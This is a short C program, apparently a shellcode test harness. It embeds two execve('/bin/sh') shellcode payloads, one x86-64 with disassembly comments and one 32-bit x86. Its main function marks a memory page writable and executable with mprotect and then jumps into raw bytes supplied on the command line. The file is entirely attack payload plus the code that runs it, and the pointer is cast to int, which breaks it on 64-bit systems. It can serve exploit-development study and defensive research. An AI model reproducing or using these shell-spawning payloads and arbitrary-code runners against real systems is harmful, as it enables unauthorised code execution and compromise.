#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <malloc.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>

char code64[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall

unsigned char code[] = \
	"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("usage: play 'shellcode'");
		return -1;
	}
	char *shcode = argv[1];	
	printf("Shellcode length: %d\n", strlen(shcode));
	int r =  mprotect((void *)((int)shcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
	printf("mprotect: %d\n",r);
	int (*ret)() = (int(*)())shcode;
	return ret();
    //return 0;
}
